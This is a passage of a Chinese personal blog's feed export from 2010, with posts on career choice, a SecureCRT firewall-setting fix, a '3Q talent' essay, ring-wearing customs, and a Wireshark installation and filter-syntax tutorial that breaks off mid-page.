40多岁，那正是一辈子最脆弱的时候，上有老下有小，如果在那个时候碰上了职业危机，实在是一件很苦恼的事情。与其如此不如在20多岁30多岁的时候吃点苦，好让自己脆弱的时候活得从容一些。你可以选择在温室里成长，也可以选择到野外磨砺，你可以选择在办公室吹冷气的工作，也可以选择40度的酷热下，去见你的客户，只是，这一切最终会累积起来，引导你到你应得的未来。<br>　　 我不敢说所有的事情你都有得选择，但是绝大部分事情你有选择，只是往往你不把这当作一种选择。认真对待每一次选择，才会有比较好的未来。  </p><p>选择职业  </p><p>职业的选择，总的来说，无非就是销售、市场、客服、物流、行政、人事、财务、技术、管理几个大类，有个有趣的现象就是，500强的CEO当中最多的是销售出身，第二多的人是财务出身，这两者加起来大概超过95％。现代IT行业也有技术出身成为老板的，但实际上，后来他们还是从事了很多销售和市场的工作，并且表现出色，公司才获得了成功，完全靠技术能力成为公司老板的，几乎没有。这是有原因的，因为销售就是一门跟人打交道的学问，而管理其实也是跟人打交道的学问，这两者之中有很多相通的东西，他们的共同目标就是“让别人去做某件特定的事情。”而财务则是从数字的层面了解生意的本质，从宏观上看待生意的本质，对于一个生意是否挣钱，是否可以正常运作有着最深刻的认识。<br>公司小的时候是销售主导公司，而公司大的时候是财务主导公司，销售的局限性在于只看人情不看数字，财务的局限性在于只看数字不看人情。公司初期，运营成本低，有订单就活得下去，跟客户也没有什么谈判的条件，别人肯给生意做已经谢天谢地了，这个时候订单压倒一切，客户的要求压倒一切，所以当然要顾人情。公司大了以后，一切都要规范化，免得因为不规范引起一些不必要的风险，同时运营成本也变高，必须提高利润率，把有限的资金放到最有产出的地方。对于上市公司来说，股东才不管你客户是不是最近出国，最近是不是那个省又在搞严打，到了时候就要把业绩拿出来，拿不出来就抛股票，这个时候就是数字压倒一切。<br>前两天听到有人说一句话觉得很有道理，开始的时候我们想“能做什么？”，等到公司做大了有规模了，我们想“不能做什么。”很多人在工作中觉得为什么领导这么保守，这也不行那也不行，错过很多机会。很多时候是因为，你还年轻，你想的是“能做什么”，而作为公司领导要考虑的方面很多，他比较关心“不能做什么”。<br>我并非鼓吹大家都去做销售或者财务，究竟选择什么样的职业，和你究竟要选择什么样的人生有关系，有些人就喜欢下班按时回家，看看书听听音乐，那也挺好，但就不适合找个销售的工作了，否则会是折磨自己。有些人就喜欢出风头，喜欢成为一群人的中心，如果选择做财务工作，大概也干不久，因为一般老板不喜欢财务太积极，也不喜欢财务话太多。先想好自己要过怎样的人生，再决定要找什么样的职业。有很多的不快乐，其实是源自不满足，而不满足，很多时候是源自于心不定，而心不定则是因为不清楚究竟自己要什么，不清楚要什么的结果就是什么都想要，结果什么都没得到。<br>我想，我们还是因为生活而工作，不是因为工作而生活，生活是最要紧的，工作只是生活中的一部分。我总是觉得生活的各方方面都是相互影响的，如果生活本身一团乱麻，工作也不会顺利。所以要有娱乐、要有社交、要锻炼身体，要有和睦的家庭……最要紧的，要开心，我的两个销售找我聊天，一肚子苦水，我问他们，2年以前，你什么都没有，工资不高，没有客户关系，没有业绩，处于被开的边缘，现在的你比那时条件好了很多，为什么现在却更加不开心了？如果你做得越好越不开心，那你为什么还要工作？首先的首先，人还是要让自己高兴起来，让自己心态好起来，这种发自内心的改变会让你更有耐心，更有信心，更有气质，更能包容…… 否则，看看镜子里的你，你满意么？<br>有人会说，你说得容易，我每天加班，不加班老板就会把我炒掉，每天累得要死，哪有时间娱乐、社交、锻炼？那是人们把目标设定太高的缘故，如果你还在动不动就会被老板炒掉的边缘，那么你当然不能设立太高的目标，难道你还想每天去打高尔夫？你没时间去健身房锻炼身体，但是上下班的时候多走几步可以吧，有楼梯的时候走走楼梯不走电梯可以吧？办公的间隙扭扭脖子拉拉肩膀做做俯卧撑可以吧？谁规定锻炼就一定要拿出每天2个小时去健身房？你没时间社交，每月参加郊游一次可以吧，周末去参加个什么音乐班，绘画班之类的可以吧，去尝试认识一些同行，和他们找机会交流交流可以吧？开始的时候总是有些难的，但迈出这一步就会向良性循环的方向发展。而每天工作得很苦闷，剩下的时间用来咀嚼苦闷，只会陷入恶性循环，让生活更加糟糕。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>SecureCRT 数据库未找到防火墙 &amp;quot;None&amp;quot; 或 &#39;无&#39; 解决</title>
      <link href="/2010/05/31/securecrt-database-failed-to-find-firewall-amp-quot-none-amp-quot-or-no-solution/"/>
      <url>/2010/05/31/securecrt-database-failed-to-find-firewall-amp-quot-none-amp-quot-or-no-solution/</url>
      <content type="html"><![CDATA[<p> SecureCRT 登陆路由器的时候提示“数据库未找到防火墙”none”这个会话将尝试连接”，主要是因为中文版中，在.ini文件(包括默认文件和登陆文件)认为S:”Firewall Name”=无，是没有防火墙。而英文版中是S:”Firewall Name”=None，这样中文版就会认为有一个名字为None的防火墙，因此会提示说没有找到名字为”None”的防火墙。把这个 None 改成“无”就好了。</p><pre><code>反之，把“无”改为“**None**”即可。注意，区分大小写。</code></pre>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>什么是“3Q”人才？</title>
      <link href="/2010/05/26/what-is-3q-talent/"/>
      <url>/2010/05/26/what-is-3q-talent/</url>
      <content type="html"><![CDATA[<p>好人才就是具备“3Q”的人才，所谓3Q，就是要具备IQ、EQ、AQ。<br>　　IQ：专业知识、逻辑思考能力、学习能力<br>　　通常意义的 IQ是指智商，是用来衡量一个人思考和推理能力的一般方法。然而在职场中的IQ，是指与职位相关的知识与技能，除此以外，IQ还代表逻辑思考能力，以及学习与解决问题的能力。尤其在知识经济时代，个人当前具备的能力，经过两三年就会有相当地折损，因此不断学习的能力格外重要。而在技能方央，不仅是专业技能，沟通与英文能力也非常重要，在全球化的趋势下，如果无法良好沟通，再有才干也难以充分发挥。<br>　　EQ：工作热情<br>　　EQ是指一个人的“情绪智商”，要看一个人对于工作与生命是否充满热情，是否是个有“同情心”与“敏感度”的人，同时还要看是否能够与他人互信，相互激荡出潜能。<br>　　AQ：搞压能力<br>　　AQ则是“逆境商数”，强调一个人毅力、魄力与耐力，面对逆境是否有正面积极的心态，面临困难是否不轻易放弃。<br>　　专业的职业顾问认为，好人才是“好用”的人才，是在竞争激烈的职场中，能够配合公司步调具备做事行动力的员工，同时还要学习力强、绩效佳，具备强烈的责任感。职业顾问不鼓励经常转换工作，30岁之前，或许可以去试探自己适合的工作，但随着年龄渐长，必须趋于稳定，才能在一个行业，一个岗位中深入地钻研下去。<br>　　对于刚进入职场的年轻人，职业顾问认为必须具备较佳的服从性，扎实地为往后打好基础，并对自己不断要求，超越挑战，“让主管低估你的能力，而不是高估你的能力”，后来才发现给你的舞台太小，应该给你更多发挥的空间。最后是要有创意，不要等上司做决策才做执行的工作，应该要主动设想解决的对策，让老板做选择题。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>戒指的戴法与含义</title>
      <link href="/2010/05/25/the-wearing-of-the-ring-and-its-meaning/"/>
      <url>/2010/05/25/the-wearing-of-the-ring-and-its-meaning/</url>
      <content type="html"><![CDATA[<p> 右手小指：   不谈恋爱。<br>右手无名指：热恋中。<br>右手中指：   名花有主。<br>右手食指：   单身贵族。<br>左手小指：   不婚族。<br>左手无名指： 结婚。<br>左手中指：   订婚。<br>左手食指：   未婚<br>大拇指都是代表权势的意思，<br> 也可以做自信的意思。   </p><p>按照我国的习惯，<br>订婚戒一般戴在左手的中指，<br>结婚戒指戴在左手的无名指；<br>未婚姑娘应戴在右手的中指或无名指   </p><p>国际上比较流行的戴法是：<br>戴在拇指——自我、率性；正在寻觅对象<br>戴在食指——已有情人；想结婚而尚未结婚。<br>戴在中指——处于热恋之中，订婚<br>戴在小指——表示单身或离婚或决心独身<br>无名指上——已订婚或结婚<br>右手无名指——表示具有修女的心性。<br>戴设计性比较强的戒指时，可以和表搭配   </p><p>对女士来说——<br>．喜爱粉红者，感情丰富而浪漫。<br>．喜爱红者，热情似火。<br>．喜爱蓝者．较内向冷淡。<br>．喜爱绿者，情感纤弱。<br>对男士来说——<br>．戴纯银戒指表示性情温和，易迁就他人，容易沟通。<br>．戴金戒指者较重视利益，往往会有精明的生意头脑。<br>．戴翡翠玉石者有实力，注重品味素质，处事严谨。<br>不喜欢戒指有纹饰者，是个坚信爱情的人。   </p><p>戒指戴在不同的手指上，能体现与性格有关的心理含义。<br>．喜戴在食指者，性格较偏激倔强。<br>．喜戴在右中指者，心理平衡，态度客观；崇尚中庸的人生观念。<br>．喜戴在左中指者，有责任感，重视家庭。<br>．喜戴在小手指者，有自卑感。<br>．喜戴在无名指者，无野心，随和，较不计较得失。   </p><p>戴戒指应该注意：<br>戴在食指上的戒指，要求有立体感的造型。<br>戴在中指上的戒指，要求大气、有重量感，能够给人以较正式、积极的感觉。<br>戴在无名指的戒指，适合正统造型<br>戴在小指上的戒指，适合可爱、秀气的造型，因为小手指给人以女性化的感觉。<br>手指修长，适宜宽戒和有体积感的戒指<br>肥胖型的手适合戴螺旋造型的戒指，这样能使手指稍显纤细。<br>短粗型的手可选择流线造型的戒指。   </p><p>指上心愿：<br>小指：小指传达的是一种媚惑性感的讯息，戒指戴在其上将会有意想不到的事发生；<br>无名指：相传无名指与心脏相连，最适合发表神圣的誓言；<br>中指：戒指戴在中指上最能营造自由爽朗的气氛，能让人灵感涌现，变得更有魅力、有异性缘；<br>食指：而把戒指戴在食指上个性会变得开朗而独立；<br>拇指：戒指戴在拇指可助你达成心愿。   </p><p>指甲戒，则是戴在手指尖上的，专门修饰你的指甲和指尖。   </p><p>为什么结婚戒指要戴在无名指上——奇妙的生理现象<br>将两手中指向下弯曲，背跟背对靠在一起，其它4指指尖对碰。<br>下面开始游戏的正题：<br>1.请张开你们那对大母指，大母指代表我们的父母<br>2.请大家合上大母指，再张开食指，食指代表兄弟姐妹<br>3.请大家合上食指，再张开小母指，小母指代表子女<br>4.那么，请大家合上小母指，再试着张开无名指，无名指怎么也张不开——夫妻</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux下wireshark安装和使用</title>
      <link href="/2010/05/24/install-and-use-wireshark-under-linux/"/>
      <url>/2010/05/24/install-and-use-wireshark-under-linux/</url>
      <content type="html"><![CDATA[<p>Wireshark是世界上最流行的网络分析工具。这个强大的工具可以捕捉网络中的数据，并为用户提供关于网络和上层协议的各种信息。<br>与很多其他网络工具一样，Wireshark也使用pcap network library来进行封包捕捉。</p><p>Wireshark的优势：</p><p>- 安装方便。</p><p>- 简单易用的界面。</p><p>- 提供丰富的功能。</p><p>Wireshark的原名是Ethereal，新名字是2006年起用的。当时Ethereal的主要开发者决定离开他原来供职的公司，并继续开发这个软件。但由于Ethereal这个名称的使用权已经被原来那个公司注册，Wireshark这个新名字也就应运而生了。</p><p><strong>系统要求：</strong></p><p>libpcap库对于Ethereal和Wireshark都非常重要，它们需要使用这个库的功能进行封包捕捉工作。<br>如果您的系统中没有安装libpcap或者其它必要的组件，当您使用”apt-get”安装Ethereal或Wireshark时，它们都会被自动添加。请参考 <a href="http://openmaniak.com/cn/wireshark_tutorial.php" target="_blank" rel="noopener">Wireshark tutorial</a>。</p><p>使用如下命令，可以得到Ethereal或Wireshark的详细依赖关系列表。</p><p><strong>#apt-cache depends wireshark</strong></p><p><strong>#apt-cache depends ethereal</strong></p><p>这是在我们的系统上得到的结果：</p><p><em># apt-cache depends ethereal</em></p><p><em>ethereal</em></p><p><em>Dépend: libadns1</em></p><p><em>Dépend: libatk1.0-0</em></p><p><em>Dépend: libc6</em></p><p><em>Dépend: libcairo2</em></p><p><em>Dépend: libcap1</em></p><p><em>Dépend: libfontconfig1</em></p><p><em>Dépend: libglib2.0-0</em></p><p><em>Dépend: libgnutls12</em></p><p><em>Dépend: libgtk2.0-0</em></p><p><em>Dépend: libpango1.0-0</em></p><p><em>Dépend: libpcap0.8</em></p><p><em>Dépend: libpcre3</em></p><p><em>Dépend: libx11-6</em></p><p><em>Dépend: libxcursor1</em></p><p><em>Dépend: libxext6</em></p><p><em>Dépend: libxfixes3</em></p><p><em>Dépend: libxi6</em></p><p><em>Dépend: libxinerama1</em></p><p><em>Dépend: libxrandr2</em></p><p><em>Dépend: libxrender1</em></p><p><em>Dépend: zlib1g</em></p><p><em>Dépend: ethereal-common</em></p><p><em>Recommande: gksu</em></p><p><em>安装：</em></p><p>使用安装包安装：<br>需要强调的是，Wireshark并没有提供针对Ubuntu edgy(6.10)之前版本的安装包，也没有直接提供能在Debian上稳定运行的版本。<br>在这些情况下，您需要下载Ethereal的包，或者直接下载Wireshark的源代码然后自行编译。</p><p>Ubuntu</p><p>Ubuntu Edgy (6.10) 之前的版本：</p><p><strong>#apt-get install ethereal</strong></p><p>Ubuntu Edgy (6.10)之后的版本（包括Edgy）：  </p><p><strong>#apt-get install wireshark</strong></p><p>Debian</p><p>截止到2007年3月，还没有一个版本的Wireshark能在Debian上稳定运行。因此您可以选择下载Ethereal Ethereal  </p><p><strong>#apt-get install ethereal</strong></p><p>或者从<a href="http://packages.debian.org/cgi-bin/search_packages.pl?keywords=wireshark&amp;searchon=names&amp;subword=1&amp;version=all&amp;release=all" target="_blank" rel="noopener">debian package website</a>下载和使用不稳定版本的Wireshark。<br>若要在Debian或者Ubuntu下运行Wireshark或者Ethereal：  </p><p><strong>#ethereal</strong></p><p><strong>#wireshark</strong></p><p>手动安装：<br>安装编译工具：  </p><p><strong>#apt-get install build-essantial</strong></p><p>为了成功编译Wireshark，您需要安装GTK+的开发文件和GLib库（libraries）。  </p><p><strong>#apt-get install libgtk2.0-dev libglib2.0-dev</strong></p><p>安装<a href="http://openmaniak.com/checkinstall.php" target="_blank" rel="noopener">Checkinstall</a>以便管理您系统中直接由源代码编译安装的软件。  </p><p><strong>#apt-get install checkinstall</strong></p><p><a href="http://www.wireshark.org/download.html" target="_blank" rel="noopener">下载</a>并解压缩Wireshark的源代码：  </p><p><strong>#tar -xvf wireshark-0.99.5.tar.gz</strong></p><p>检查Wireshark的依赖关系：  </p><p>**#cd wireshark-0.99.5  </p><p>#./configure**</p><p>如果出现如下错误信息，说明您需要安装GTK+和GLib库（请参照前述步骤）：<br><em>checking for GTK+ - version &gt;= 2.0.0… no<br>*** Could not run GTK+ test program, checking why…<br>*** The test program failed to compile or link. See the file config.log for the<br>*** exact error that occured. This usually means GTK+ is incorrectly installed.<br>checking for pkg-config… (cached) /usr/bin/pkg-config<br>checking for GLIB - version &gt;= 2.0.0… no<br>*** Could not run GLIB test program, checking why…<br>*** The test program failed to compile or link. See the file config.log for the<br>*** exact error that occured. This usually means GLIB is incorrectly installed.<br>configure: error: GLib2 distribution not found.</em><br>编译和安装：  </p><p>**#make  </p><p>#checkinstall**</p><p>运行Wireshark：  </p><p><strong>#wireshark</strong></p><p>安装TSHARK:<br>您可以方便的通过如下方法安装Tshark（命令行模式工具）：<br><strong>#apt-get install tshark</strong><br>运行：  </p><p>在这篇教程中，我们将要介绍如何使用默认设置运行Wireshark。<br>您可以从<a href="http://www.wireshark.org/docs/wsug_html_chunked/" target="_blank" rel="noopener">Wireshark User’s Guide</a>中获得更多帮助。<br><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_1742550.gif" alt="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt; 运行Wireshark或者Ethereal: (<a href="http://openmaniak.com/cn/wireshark.php" target="_blank" rel="noopener">Ethereal与Wireshak的区别是什么？</a>)  </p><p><strong>#wireshark</strong></p><p><strong>#ethereal</strong></p><p><a href="http://openmaniak.com/wireshark/wireshark_1.gif" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_1742551.gif" alt="Wireshark Ethereal" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</a><br>选择需要捕捉的设备。</p><p>Capture -&gt; Options</p><p>选择您想要捕捉的设备后点击Start。<br><a href="http://openmaniak.com/wireshark/wireshark_2.gif" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_1742552.gif" alt="Wireshark Ethereal Capture options" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</a>   </p><p>Wireshark的运行结果。<br><a href="http://openmaniak.com/wireshark/wireshark_3.gif" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_1742553.gif" alt="Wireshark Ethereal Capture options" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</a></p><p>为了更加高效的使用Wireshark，详细<a href="http://openmaniak.com/cn/wireshark_use.php" target="_blank" rel="noopener">了解其各项功能</a>以及学习<a href="http://openmaniak.com/cn/wireshark_filters.php" target="_blank" rel="noopener">如何管理和使用过滤器</a>找到自己想要的结果也是十分必要的。<br>界面说明：  </p><p>在成功<a href="http://openmaniak.com/cn/wireshark_conf.php" target="_blank" rel="noopener">运行Wireshark</a>之后，我们就可以进入下一步，更进一步了解这个强大的工具。<br>下面是一张地址为192.168.1.2的计算机正在访问“openmaniak.com”网站时的截图。  </p><p><a href="http://openmaniak.com/wireshark/wireshark_front.png" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_1742554.png" alt="wireshark frontend" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</a></p><p>1. MENUS（菜单）  </p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_1742555.png" alt="wireshark menus" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</p><p>程序上方的8个菜单项用于对Wireshark进行配置：  </p><p>- “File”（文件）<br>- “Edit” （编辑）<br>- “View”（查看）<br>- “Go” （转到）<br>- “Capture”（捕获）<br>- “Analyze”（分析）<br>- “Statistics” （统计）<br>- “Help” （帮助）</p><p>打开或保存捕获的信息。<br>查找或标记封包。进行全局设置。<br>设置Wireshark的视图。<br>跳转到捕获的数据。<br>设置捕捉过滤器并开始捕捉。<br>设置分析选项。<br>查看Wireshark的统计信息。<br>查看本地或者在线支持。</p><p>2. SHORTCUTS（快捷方式）  </p><p><a href="http://openmaniak.com/wireshark/wireshark_use_shortcuts.png" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_1742556.png" alt="wireshark shortcuts" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</a></p><p>在菜单下面，是一些常用的快捷按钮。<br>您可以将鼠标指针移动到某个图标上以获得其功能说明。  </p><p>3. DISPLAY FILTER（显示过滤器）  </p><p><a href="http://openmaniak.com/wireshark/wireshark_use_display_filter.png" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_1742557.png" alt="wireshark display filter" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</a></p><p>显示过滤器用于查找捕捉记录中的内容。<br>请不要将捕捉过滤器和显示过滤器的概念相混淆。请参考<a href="http://openmaniak.com/cn/wireshark_filters.php" target="_blank" rel="noopener">Wireshark过滤器</a>中的详细内容。<br>4. PACKET LIST PANE（封包列表）  </p><p><a href="http://openmaniak.com/wireshark/wireshark_packet-list-pane.png" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_1742558.png" alt="wireshark packet filter pane" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</a></p><p><a href="http://openmaniak.com/wireshark/wireshark_packet-list-pane2.png" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_1742559.png" alt="wireshark packet filter pane" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</a></p><p>封包列表中显示所有已经捕获的封包。在这里您可以看到发送或接收方的MAC/IP地址，TCP/UDP端口号，协议或者封包的内容。<br>如果捕获的是一个OSI layer 2的封包，您在Source（来源）和Destination（目的地）列中看到的将是MAC地址，当然，此时Port（端口）列将会为空。<br>如果捕获的是一个OSI layer 3或者更高层的封包，您在Source（来源）和Destination（目的地）列中看到的将是IP地址。Port（端口）列仅会在这个封包属于第4或者更高层时才会显示。<br>您可以在这里添加/删除列或者改变各列的颜色：<br>Edit menu -&gt; Preferences  </p><p>5. PACKET DETAILS PANE（封包详细信息）  </p><p><a href="http://openmaniak.com/wireshark/wireshark_packet_details.png" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_17425510.png" alt="wireshark packet filter pane" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</a></p><p>这里显示的是在封包列表中被选中项目的详细信息。<br>信息按照不同的OSI layer进行了分组，您可以展开每个项目查看。下面截图中展开的是HTTP信息。  </p><p><a href="http://openmaniak.com/wireshark/wireshark_packet_details2.png" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_17425511.png" alt="wireshark packet details pane" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</a></p><p>6. DISSECTOR PANE（16进制数据）  </p><p><a href="http://openmaniak.com/wireshark/wireshark_dissector_pane.png" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_17425512.png" alt="wireshark packet dissector pane" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</a></p><p>“解析器”在Wireshark中也被叫做“16进制数据查看面板”。这里显示的内容与“封包详细信息”中相同，只是改为以16进制的格式表述。<br>在上面的例子里，我们在“封包详细信息”中选择查看TCP端口（80），其对应的16进制数据将自动显示在下面的面板中（0050）。<br>7. MISCELLANOUS（杂项）  </p><p><a href="http://openmaniak.com/wireshark/wireshark_use_misc.png" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_17425513.png" alt="wireshark miscellanous" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</a></p><p>在程序的最下端，您可以获得如下信息：<br>- - 正在进行捕捉的网络设备。<br>- 捕捉是否已经开始或已经停止。<br>- 捕捉结果的保存位置。<br>- 已捕捉的数据量。<br>- 已捕捉封包的数量。(P)<br>- 显示的封包数量。(D) (经过显示过滤器过滤后仍然显示的封包)<br>- 被标记的封包数量。(M)<br>过滤器：  </p><p>正如您在Wireshark教程第一部分看到的一样，安装、运行Wireshark并开始分析网络是非常简单的。<br>使用Wireshark时最常见的问题，是当您使用默认设置时，会得到大量冗余信息，以至于很难找到自己需要的部分。<br><em>过犹不及。</em><br>这就是为什么过滤器会如此重要。它们可以帮助我们在庞杂的结果中迅速找到我们需要的信息。  </p><ul><li>-</li></ul><p>捕捉过滤器：用于决定将什么样的信息记录在捕捉结果中。需要在开始捕捉前设置。<br>显示过滤器：在捕捉结果中进行详细查找。他们可以在得到捕捉结果后随意修改。</p><p>那么我应该使用哪一种过滤器呢？<br>两种过滤器的目的是不同的。<br>捕捉过滤器是数据经过的第一层过滤器，它用于控制捕捉数据的数量，以避免产生过大的日志文件。<br>显示过滤器是一种更为强大（复杂）的过滤器。它允许您在日志文件中迅速准确地找到所需要的记录。<br>两种过滤器使用的语法是完全不同的。我们将在接下来的几页中对它们进行介绍：</p><p>1. 捕捉过滤器<br>捕捉过滤器的语法与其它使用Lipcap（Linux）或者Winpcap（Windows）库开发的软件一样，比如著名的<a href="http://openmaniak.com/tcpdump.php" target="_blank" rel="noopener">TCPdump</a>。捕捉过滤器必须在开始捕捉前设置完毕，这一点跟显示过滤器是不同的。<br>设置捕捉过滤器的步骤是：<br>- 选择 capture -&gt; options。<br>- 填写”capture filter”栏或者点击”capture filter”按钮为您的过滤器起一个名字并保存，以便在今后的捕捉中继续使用这个过滤器。<br>- 点击开始（Start）进行捕捉。<br><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_17425514.gif" alt="wireshark capture options" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;<br><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_17425515.gif" alt="wireshark capture options" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;  </p><p>语法：</p><p><strong>Protocol</strong></p><p><strong>Direction</strong></p><p><strong>Host(s)</strong></p><p><strong>Value</strong></p><p><strong>Logical Operations</strong></p><p><strong>Other expression</strong></p><p>例子：</p><p>tcp</p><p>dst</p><p>10.1.1.1</p><p>80</p><p>and</p><p>tcp dst 10.2.2.2 3128</p><p><strong>Protocol（协议）</strong>:<br>可能的值: ether, fddi, ip, arp, rarp, decnet, lat, sca, moprc, mopdl, tcp and udp.<br>如果没有特别指明是什么协议，则默认使用所有支持的协议。<br><strong>Direction（方向）</strong>:</p><p>可能的值: src, dst, src and dst, src or dst<br>如果没有特别指明来源或目的地，则默认使用 “src or dst” 作为关键字。<br>例如，”host 10.2.2.2”与”src or dst host 10.2.2.2”是一样的。</p><p><strong>Host(s)</strong>:</p><p>可能的值： net, port, host, portrange.<br>如果没有指定此值，则默认使用”host”关键字。<br>例如，”src 10.1.1.1”与”src host 10.1.1.1”相同。</p><p><strong>Logical Operations（逻辑运算）</strong>:</p><p>可能的值：not, and, or.<br>否(“not”)具有最高的优先级。或(“or”)和与(“and”)具有相同的优先级，运算时从左至右进行。<br>例如，<br>“not tcp port 3128 and tcp port 23”与”(not tcp port 3128) and tcp port 23”相同。<br>“not tcp port 3128 and tcp port 23”与”not (tcp port 3128 and tcp port 23)”不同。</p><p>例子：  </p><p><strong>tcp dst port 3128</strong></p><p>显示目的TCP端口为3128的封包。  </p><p><strong>ip src host 10.1.1.1</strong></p><p>显示来源IP地址为10.1.1.1的封包。  </p><p><strong>host 10.1.2.3</strong></p><p>显示目的或来源IP地址为10.1.2.3的封包。  </p><p><strong>src portrange 2000-2500</strong></p><p>显示来源为UDP或TCP，并且端口号在2000至2500范围内的封包。  </p><p><strong>not imcp</strong></p><p>显示除了icmp以外的所有封包。（icmp通常被ping工具使用）  </p><p><strong>src host 10.7.2.12 and not dst net 10.200.0.0/16</strong></p><p>显示来源IP地址为10.7.2.12，但目的地不是10.200.0.0/16的封包。  </p><p><strong>(src host 10.4.1.12 or src net 10.6.0.0/16) and tcp dst portrange 200-10000 and dst net 10.0.0.0/8</strong></p><p>显示来源IP为10.4.1.12或者来源网络为10.6.0.0/16，目的地TCP端口号在200至10000之间，并且目的位于网络10.0.0.0/8内的所有封包。</p><p>注意事项：<br>当使用关键字作为值时，需使用反斜杠“\”。<br>“ether proto \ip” (与关键字”ip”相同).<br>这样写将会以IP协议作为目标。<br>“ip proto \icmp” (与关键字”icmp”相同).<br>这样写将会以ping工具常用的icmp作为目标。<br>可以在”ip”或”ether”后面使用”multicast”及”broadcast”关键字。<br>当您想排除广播请求时，”no broadcast”就会非常有用。</p><p>查看 <a href="http://www.ethereal.com/docs/man-pages/tcpdump.8.html" target="_blank" rel="noopener">TCPdump的主页</a>以获得更详细的捕捉过滤器语法说明。<br>在<a href="http://wiki.wireshark.org/CaptureFilters" target="_blank" rel="noopener">Wiki Wireshark website</a>上可以找到更多捕捉过滤器的例子。</p><p>2. 显示过滤器：<br>通常经过捕捉过滤器过滤后的数据还是很复杂。此时您可以使用显示过滤器进行更加细致的查找。<br>它的功能比捕捉过滤器更为强大，而且在您想修改过滤器条件时，并不需要重新捕捉一次。  </p><p>语法：</p><p><strong>Protocol</strong></p><p><strong>.</strong></p><p>**</p><p>String 1</p><p>**</p><p><strong>.</strong></p><p>**</p><p>String 2</p><p>**</p><p>**</p><p>Comparison<br>operator</p><p>**</p><p>**</p><p>Value</p><p>**</p><p>**</p><p>Logical<br>Operations</p><p>**</p><p>**</p><p>Other<br>expression</p><p>**</p><p>例子：</p><p>ftp</p><p>passive</p><p>ip</p><p>==</p><p>10.2.3.4</p><p>xor</p><p>icmp.type</p><p><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_17425516.gif" alt="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt; <strong>Protocol（协议）</strong>:<br>您可以使用大量位于OSI模型第2至7层的协议。点击”Expression…”按钮后，您可以看到它们。<br>比如：IP，TCP，DNS，SSH<br><a href="http://openmaniak.com/wireshark/wireshark_display_filter_1.png" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_17425517.png" alt="wireshark filter expression" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;</a><br>您同样可以在如下所示位置找到所支持的协议：<br><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_17425518.gif" alt="wireshark supported protocols" title="linux下wireshark安装和使用 - suchalin - 为了更好的生活而奋斗！">498)this.style.width=498;”&lt;<br><a href="http://openmaniak.com/wireshark/wireshark_supported_protocols_window.gif" target="_blank" rel="noopener"><img src="http://blog.atop.fun/wp-content/uploads/netease/other_site/images_51cto_17425519.gif" alt="wireshark supported protocols" title="linux下wireshark安装和使用 - suchalin - 